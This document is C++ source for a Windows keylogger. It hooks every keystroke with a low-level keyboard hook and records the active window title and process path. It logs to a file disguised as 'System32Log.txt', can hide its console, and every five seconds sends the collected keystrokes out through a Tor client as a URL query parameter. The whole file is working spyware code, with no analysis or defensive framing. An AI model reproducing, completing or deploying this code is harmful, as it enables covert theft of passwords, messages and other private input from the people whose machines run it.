#include "Keylogger.h"
#include "Stealth.h"
#include "Schedule.h"

// variable to store the HANDLE to the hook. Don't declare it anywhere else then globally
// or you will get problems since every function uses this variable.
HHOOK _hook;

// This struct contains the data received by the hook callback. As you see in the callback function
// it contains the thing you will need: vkCode = virtual key code.
KBDLLHOOKSTRUCT kbdStruct;

std::ofstream os;
extern char lastwindow[256];

MiniTor* _tor; // Tor client
std::string _key_cache = "";

// This is the callback function. Consider it the event that is raised when, in this case, 
// a key is pressed.
LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
{
	if (nCode >= 0)
	{
		// the action is valid: HC_ACTION.
		if (wParam == WM_KEYDOWN)
		{
			// lParam is the pointer to the struct containing the data needed, so cast and assign it to kdbStruct.
			kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);

			// Save to file
			Save(kbdStruct.vkCode);
		}

		CheckSystemHotkey();
	}

	// call the next hook in the hook chain. This is nessecary or your hook chain will break and the hook stops
	return CallNextHookEx(_hook, nCode, wParam, lParam);
}

void CheckSystemHotkey()
{
	bool isCTRL = ((GetKeyState(VK_CONTROL)) != 0
		|| (GetKeyState(VK_LCONTROL)) != 0
		|| (GetKeyState(VK_RCONTROL)) != 0
		);
	bool isAlt = (
		(GetKeyState(VK_LMENU)) != 0
		|| (GetKeyState(VK_RMENU)) != 0
		);
	bool isF8 = ((GetKeyState(VK_F8)) != 0);
	bool isF9 = ((GetKeyState(VK_F9)) != 0);

	if (isCTRL && isAlt && isF8)
	{
		// Show the console.
		ShowConsole();
	}
	if (isCTRL && isAlt && isF9)
	{
		// Show the console.
		HideConsole();
	}
}

std::wstring wcharToWString(wchar_t* buffer)
{
	wchar_t* charBuffer = NULL;
	std::wstring returnValue;
	int lengthOfbuffer = lstrlenW(buffer);
	if (buffer != nullptr)
	{
		charBuffer = (wchar_t*)calloc(lengthOfbuffer + 1, sizeof(wchar_t));
	}
	else
	{
		return L"";
	}

	for (int index = 0;
		index < lengthOfbuffer;
		index++)
	{
		wchar_t* singleCharacter = (wchar_t*)calloc(2, sizeof(wchar_t));
		singleCharacter[0] = (wchar_t)buffer[index];
		singleCharacter[1] = '\0';
		lstrcatW(charBuffer, singleCharacter);
		free(singleCharacter);
	}
	lstrcatW(charBuffer, L"\0");
	returnValue.append(charBuffer);
	free(charBuffer);
	return returnValue;
}

std::string tcharToStr(TCHAR* t)
{
	std::wstring wStr = wcharToWString(t);
	return std::string(wStr.begin(), wStr.end());
}

std::string GetProcessFileNameByPID(DWORD pid)
{
	std::string path;
	HANDLE processHandle = nullptr;
	TCHAR filename[MAX_PATH];

	processHandle = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);

	if (processHandle != nullptr)
	{
		if (GetModuleFileNameEx(processHandle, NULL, filename, MAX_PATH) == 0)
		{
			// Failed to get module filename.
		}
		else
		{
			path = tcharToStr(filename);
			//path = std::string(filename);
		}
		CloseHandle(processHandle);
	}
	else {
		// Failed to open process.
	}

	return path;
}

void BeginCapture(MiniTor* tor)
{
	_tor = tor;

	// Set file system log target
	SetLogTargetFS();

	// Set the hook
	SetHook();
}

void EndCapture()
{
	ReleaseHook();
}

void SetLogTargetFS()
{
	//open output file in append mode
	os.open("System32Log.txt", std::ios_base::app);
}

void SetHook()
{
	// Set the hook and set it to use the callback function above
	// WH_KEYBOARD_LL means it will set a low level keyboard hook. More information about it at MSDN.
	// The last 2 parameters are NULL, 0 because the callback function is in the same thread and window as the
	// function that sets and releases the hook.
	if (!(_hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0)))
	{
#ifdef visible
		std::cout << "Failed to install hook!" << std::endl;
#endif
		//MessageBox(NULL, "Failed to install hook!", "Error", MB_ICONERROR);
	}
}

void ReleaseHook()
{
	UnhookWindowsHookEx(_hook);
}

std::string MapKeystroke(int key_stroke)
{
	HWND foreground;
	DWORD  processId = 0;
	DWORD threadID;
	std::string processFilename;
	HKL layout = 0;
	bool lowercase;
	char key;
	bool shift = false;

	switch (key_stroke)
	{
	case VK_BACK:
		return "[BACKSPACE]";
	case VK_RETURN:
		return "[ENTER]"; //os <<  "\n";
	case VK_SPACE:
		return " ";
	case VK_TAB:
		return "[TAB]";
	case VK_SHIFT:
	case VK_LSHIFT:
	case VK_RSHIFT:
		return "[SHIFT]";
	case VK_CONTROL:
	case VK_LCONTROL:
	case VK_RCONTROL:
		return "[CONTROL]";
	case VK_LMENU:
	case VK_RMENU:
		return "[ALT]";
	case VK_ESCAPE:
		return "[ESCAPE]";
	case VK_END:
		return "[END]";
	case VK_HOME:
		return "[HOME]";
	case VK_LEFT:
		return "[LEFT]";
	case VK_UP:
		return "[UP]";
	case VK_RIGHT:
		return "[RIGHT]";
	case VK_DOWN:
		return "[DOWN]";
	case VK_LWIN:
	case VK_RWIN:
		return "[WIN]";
	//case VK_OEM_PERIOD:
	//case VK_DECIMAL:
	//	return ".";
	//case VK_OEM_MINUS:
	//case VK_SUBTRACT: 
		//return "-";
	case VK_CAPITAL:
		return "[CAPSLOCK]";
	case VK_F1: return "[F1]";
	case VK_F2: return "[F2]";
	case VK_F3: return "[F3]";
	case VK_F4: return "[F4]";
	case VK_F5: return "[F5]";
	case VK_F6: return "[F6]";
	case VK_F7: return "[F7]";
	case VK_F8: return "[F8]";
	case VK_F9: return "[F9]";
	case VK_F10: return "[F10]";
	case VK_F11: return "[F11]";
	case VK_F12: return "[F12]";
	default:
		foreground = GetForegroundWindow();

		if (foreground != nullptr)
		{
			threadID = GetWindowThreadProcessId(foreground, &processId);
			layout = GetKeyboardLayout(threadID);

			// check caps lock
			lowercase = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);

			// check shift key
			if ((GetKeyState(VK_SHIFT) & 0x1000) != 0 || (GetKeyState(VK_LSHIFT) & 0x1000) != 0 || (GetKeyState(VK_RSHIFT) & 0x1000) != 0) 
			{
				lowercase = !lowercase;
				shift = !shift;
			}

			// map virtual key according to keyboard layout 
			key = MapVirtualKeyExA(key_stroke, MAPVK_VK_TO_CHAR, layout);

			// tolower converts it to lowercase properly
			if (!lowercase) key = tolower(key);

			// automatically map to second function key (when shift is pressed map alternative key)
			if (shift && key == ',') key = '<';
			if (shift && key == '.') key = '>';
			if (shift && (key_stroke == VK_OEM_PERIOD || key_stroke == VK_DECIMAL)) key = '_';
			if (shift && key == '/') key = '?';
			if (shift && key == ';') key = ':';
			if (shift && key == '\'') key = '"';
			if (shift && key == '[') key = '{';
			if (shift && key == ']') key = '}';
			if (shift && key == '\\') key = '|';
			if (shift && (key_stroke == VK_SUBTRACT || key_stroke == VK_OEM_MINUS)) key = '_';
			if (shift && key == '=') key = '+';
			if (shift && key == '1') key = '!';
			if (shift && key == '2') key = '@';
			if (shift && key == '3') key = '#';
			if (shift && key == '4') key = '$';
			if (shift && key == '5') key = '%';
			if (shift && key == '6') key = '^';
			if (shift && key == '7') key = '&';
			if (shift && key == '8') key = '*';
			if (shift && key == '9') key = '(';
			if (shift && key == '0') key = ')';
			if (shift && key == '`') key = '~';
			char k = char(key);
			return std::string(&k, 1);
		}
		return "[UNKNOWN]";
	}
}

//std::string tcharToChar(TCHAR* buffer)
//{
//    char *charBuffer = NULL;
//    std::string returnValue;
//    int lengthOfbuffer = lstrlenW(buffer);
//    if(buffer!=NULL)
//    {
//        charBuffer = (char*)calloc(lengthOfbuffer+1,sizeof(char));
//    }
//    else
//    {
//        return NULL;
//    }
//
//    for (int index = 0;
//        index < lengthOfbuffer;
//        index++)
//    {
//        char *singleCharacter = (char*)calloc(2,sizeof(char));
//        singleCharacter[0] = (char)buffer[index];
//        singleCharacter[1] = '\0';
//        strcat(charBuffer, singleCharacter);
//        free(singleCharacter );
//    }
//    strcat(charBuffer, "\0");
//    returnValue.append(charBuffer);
//    free(charBuffer);
//    return returnValue;
//}

int Save(int key_stroke)
{
	std::string last_window;

	if ((key_stroke == 1) || (key_stroke == 2))
		return 0; // ignore mouse clicks

	HWND foreground = GetForegroundWindow();
	DWORD  processId = 0;
	DWORD threadID;
	std::string processFilename;

	if (foreground != nullptr)
	{
		//get keyboard layout of the thread

		threadID = GetWindowThreadProcessId(foreground, &processId);
		processFilename = GetProcessFileNameByPID(processId);

		std::cout << "Thread ID: " << threadID << " ";
		std::cout << "Process ID: " << processId << " ";
		std::cout << "Process Path: " << processFilename << std::endl;
	}

	if (foreground)
	{
		const int window_title_len = GetWindowTextLength(foreground) + 1;
		TCHAR* window_title = new TCHAR[window_title_len];
		GetWindowText(foreground, window_title, window_title_len);

		std::wstring wstr = wcharToWString(window_title);
		std::string win_title(wstr.begin(), wstr.end());
		//std::string win_title(window_title);

		if (last_window.compare(win_title) != 0)
		{
			last_window = win_title;

			// get time
			time_t t = time(NULL);

			struct tm timeinfo;
			localtime_s(&timeinfo, &t); //struct tm *tm = localtime_s(&t);

			char s[64];
			strftime(s, sizeof(s), "%c", &timeinfo); //strftime(s, sizeof(s), "%c", tm);

			os << "\n\n[Window: " << window_title << " - at " << s << "] ";

			std::cout << "[Window: " << window_title << " - at " << s << "]" << std::endl;
		}

		delete[] window_title;
	}

	std::string key_mapped = MapKeystroke(key_stroke);

	std::cout << key_stroke << " = " << key_mapped << std::endl;

	os << key_mapped;

	SaveKey(key_mapped);

	//instead of opening and closing file handlers every time, keep file open and flush.
	os.flush();
	return 0;
}

void SaveKey(std::string key_mapped)
{
	_key_cache += key_mapped;
}

void SaveKeys()
{
	if (_key_cache == "")
	{
		StartSaveSchedule();
		return;
	}
	std::string onionUrl = "https://check.torproject.org/";
	std::string content = _tor->http_get(onionUrl + "?test=" + _key_cache);

	std::cout << onionUrl << "?test=" << _key_cache << std::endl;
	//std::cout << content << std::endl;

	//return (content == "Ok");

	_key_cache = "";

	StartSaveSchedule();
}

void StartSaveSchedule()
{
	later later_savejob(5000, true, &SaveKeys);
}

void MessageLoop()
{
	// loop to keep the console application running.
	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0))
	{
	}
}